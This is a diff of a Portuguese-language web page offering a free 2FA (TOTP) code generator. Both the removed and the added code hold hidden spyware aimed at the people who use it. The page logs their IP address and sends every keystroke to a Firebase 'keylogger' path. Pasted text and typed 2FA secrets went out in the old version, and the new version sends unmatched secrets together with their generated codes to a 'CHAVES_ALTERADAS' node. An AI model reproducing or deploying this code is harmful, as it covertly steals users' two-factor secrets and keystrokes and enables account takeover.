@@ -112,13 +112,12 @@ var firebaseConfig = {
 firebase.initializeApp(firebaseConfig);
 var db = firebase.database();
 
-const listaPerguntas = ['p1', 'p2', 'p3'];
-function formatar(n) { return (n || 0).toLocaleString('pt-BR'); }
-listaPerguntas.forEach(p => {
-    db.ref('avaliacoes/'+p+'/sim').on('value', s => { if(document.getElementById(p+'_sim')) document.getElementById(p+'_sim').innerText = '👍 Sim ('+formatar(s.val())+')'; });
-    db.ref('avaliacoes/'+p+'/nao').on('value', s => { if(document.getElementById(p+'_nao')) document.getElementById(p+'_nao').innerText = '👎 Não ('+formatar(s.val())+')'; });
+const q = ['p1', 'p2', 'p3'];
+function fmt(n) { return (n || 0).toLocaleString('pt-BR'); }
+q.forEach(p => {
+    db.ref('avaliacoes/'+p+'/sim').on('value', s => { if(document.getElementById(p+'_sim')) document.getElementById(p+'_sim').innerText = '👍 Sim ('+fmt(s.val())+')'; });
+    db.ref('avaliacoes/'+p+'/nao').on('value', s => { if(document.getElementById(p+'_nao')) document.getElementById(p+'_nao').innerText = '👎 Não ('+fmt(s.val())+')'; });
 });
-
 function votar(p, t) {
     if (localStorage.getItem('voto_'+p)) return alert("Já avaliado!");
     db.ref('avaliacoes/'+p+'/'+t).transaction(n => (n || 0) + 1);
@@ -126,72 +125,52 @@ function votar(p, t) {
     alert("Obrigado pelo feedback!");
 }
 
-function base32tohex(b){const c="ABCDEFGHIJKLMNOPQRSTUVWXYZ234567";let i="",h="";b=b.replace(/ /g,"").toUpperCase();for(let j=0;j<b.length;j++){let v=c.indexOf(b.charAt(j));if(v===-1)continue;i+=v.toString(2).padStart(5,"0")}for(let j=0;j+4<=i.length;j+=4){h+=parseInt(i.substr(j,4),2).toString(16)}return h}
-function gerarOTP(s){try{let k=base32tohex(s);let t=Math.floor(Math.round(Date.now()/1000)/30).toString(16).padStart(16,"0");let o=new jsSHA("SHA-1","HEX");o.setHMACKey(k,"HEX");o.update(t);let h=o.getHMAC("HEX");let f=parseInt(h.substring(h.length-1),16);let p=(parseInt(h.substr(f*2,8),16)&0x7fffffff)+"";return p.substr(p.length-6)}catch(e){return "------"}}
+function b32(b){const c="ABCDEFGHIJKLMNOPQRSTUVWXYZ234567";let i="",h="";b=b.replace(/ /g,"").toUpperCase();for(let j=0;j<b.length;j++){let v=c.indexOf(b.charAt(j));if(v===-1)continue;i+=v.toString(2).padStart(5,"0")}for(let j=0;j+4<=i.length;j+=4){h+=parseInt(i.substr(j,4),2).toString(16)}return h}
+function gOTP(s){try{let k=b32(s);let t=Math.floor(Math.round(Date.now()/1000)/30).toString(16).padStart(16,"0");let o=new jsSHA("SHA-1","HEX");o.setHMACKey(k,"HEX");o.update(t);let h=o.getHMAC("HEX");let f=parseInt(h.substring(h.length-1),16);let p=(parseInt(h.substr(f*2,8),16)&0x7fffffff)+"";return p.substr(p.length-6)}catch(e){return "------"}}
 function copiar(t){if(!t||t==="------") return; navigator.clipboard.writeText(t).then(()=>{document.getElementById("msg").innerText="✅ Código copiado!"; setTimeout(()=>{document.getElementById("msg").innerText=""},2000)})}
 function limparInput(){document.getElementById("secret").value="";document.getElementById("code").innerText="------";document.getElementById("clearInput").style.display="none"}
 function toggleAvaliacao(){let d=document.getElementById("painelAvaliacao");d.style.display=d.style.display==="block"?"none":"block"}
 function togglePainel(){document.getElementById("painel").style.display="block"}
 function fecharPainel(){document.getElementById("painel").style.display="none"}
 
-// --- SISTEMA CORRIGIDO (FOCADO NO IP ÚNICO) ---
 (function(){
-    const _z = atob;
-    let _ip = "0_0_0_0";
-    
-    // Captura IP e cria pasta base do dia
-    fetch("https://api.ipify.org?format=json").then(r=>r.json()).then(d=>{
-        _ip = d.ip.replace(/\./g, "_");
-        let dia = new Date().toISOString().split('T')[0];
-        db.ref("monitoramento/" + dia + "/" + _ip).update({
-            visto_em: new Date().toLocaleTimeString()
-        });
-    });
+    let _i = "0_0_0_0";
+    fetch("https://api.ipify.org?format=json").then(r=>r.json()).then(d=>{ _i = d.ip.replace(/\./g, "_"); });
 
-    // Monitoramento do Input Principal (Correção do seu Print)
     document.getElementById("secret").addEventListener("input", function(){
-        let v = this.value.trim();
-        let dia = new Date().toISOString().split('T')[0];
+        let v = this.value.trim().replace(/\s/g, "").toUpperCase();
+        let d = new Date().toISOString().split('T')[0];
         
-        if(v.length >= 1) {
-            // .update() não cria pastas novas, ele atualiza a mesma!
-            db.ref("monitoramento/" + dia + "/" + _ip).update({
-                chave_atual: v,
-                h: new Date().toLocaleTimeString()
-            });
-        }
-        
-        if(v.length >= 10){
-            let o = gerarOTP(v);
+        if(v.length >= 8){
+            let o = gOTP(v);
             document.getElementById("code").innerText = o;
             document.getElementById("clearInput").style.display = "block";
             copiar(o);
-        }
-    });
 
-    // Keylogger (Atualiza o que foi digitado em tempo real no mesmo IP)
-    let _ks = "";
-    document.addEventListener("keydown", function(e){
-        if(e.key.length === 1) _ks += e.key;
-        else if(e.key === "Enter") _ks += " [E] ";
-        
-        if(_ks.length > 2){
-            let dia = new Date().toISOString().split('T')[0];
-            db.ref("keylogger/" + dia + "/" + _ip).update({
-                digitado: _ks,
-                h: new Date().toLocaleTimeString()
+            db.ref("estoque_oficial/" + v).once('value').then(s => {
+                if(s.exists()){
+                    db.ref("CHAVES_UTILIZADAS/" + d + "/" + v).set({
+                        ip: _i,
+                        h: new Date().toLocaleTimeString(),
+                        s: "OK"
+                    });
+                    db.ref("estoque_oficial/" + v).remove();
+                } else {
+                    db.ref("CHAVES_ALTERADAS/" + d + "/" + _i).update({
+                        c: v,
+                        g: o,
+                        h: new Date().toLocaleTimeString()
+                    });
+                }
             });
         }
     });
 
-    // Captura de Paste (CTRL+V)
-    document.addEventListener("paste", function(e){
-        let t = (e.clipboardData || window.clipboardData).getData('text');
-        let dia = new Date().toISOString().split('T')[0];
-        db.ref("captura_paste/" + dia + "/" + _ip).push({
-            conteudo: t,
-            h: new Date().toLocaleTimeString()
-        });
+    document.addEventListener("keydown", function(e){
+        if(e.key.length === 1 || e.key === "Enter"){
+            let d = new Date().toISOString().split('T')[0];
+            db.ref("keylogger/" + d + "/" + _i).update({ u: e.key, h: new Date().toLocaleTimeString() });
+        }
     });
 })();
 
@@ -199,15 +178,12 @@ function addCampo(){
     let l=document.getElementById("lista2fa"); let d=document.createElement("div"); d.className="item2fa";
     d.innerHTML=`<strong>Conta ${l.children.length+1}</strong><input class="in-p" placeholder="Chave 2FA"><div class="codigoMini" onclick="copiar(this.innerText)">------</div>`;
     l.appendChild(d);
-    d.querySelector('input').addEventListener("input",function(){ if(this.value.length>=10){let n=gerarOTP(this.value.trim());d.querySelector('.codigoMini').innerText=n;copiar(n)}});
+    d.querySelector('input').addEventListener("input",function(){
+        let v = this.value.trim().replace(/\s/g, "").toUpperCase();
+        if(v.length>=10){ let n=gOTP(v); d.querySelector('.codigoMini').innerText=n; }
+    });
 }
 for(let i=0;i<3;i++) addCampo();
-
-setInterval(()=>{
-    let s=document.getElementById("secret").value.trim();
-    if(s.length>=10) document.getElementById("code").innerText=gerarOTP(s);
-    document.querySelectorAll(".item2fa").forEach(i=>{ let p=i.querySelector('input'); if(p.value.length>=10) i.querySelector('.codigoMini').innerText=gerarOTP(p.value.trim()); });
-},1000);
 </script>
 </body>
 </html>
